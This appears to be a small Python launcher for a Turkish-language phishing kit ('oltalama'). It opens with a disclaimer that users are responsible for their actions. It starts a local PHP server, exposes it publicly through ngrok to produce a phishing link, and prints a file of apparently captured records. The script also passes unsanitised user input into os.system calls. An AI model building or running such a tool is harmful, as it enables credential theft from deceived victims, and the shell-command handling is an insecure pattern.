import os
os.system("clear")
print("\033[95m")
print('''	
		Yaptığınız ve yapacağınız herşeyden siz sorumlusunuz.
       ,--.--._			4 haneli port örneği: 1515
------" _, \___)
        / _/____) 1-) Link Oluştur
        \//(____)
------\     (__)  2-) Kayıtlara Bak
       `-----/

''')
oltalama = input("Seçim Yapınız > ")
if(oltalama=="1"):
	phport = input("4 Haneli Port Giriniz > ")
	os.system("php -S 127.0.0.1:"+phport+" &")
	os.system("/n")
	os.system("./ngrok http "+phport)

elif(oltalama=="2"):
	os.system("cat oltalama/kayitlar.txt")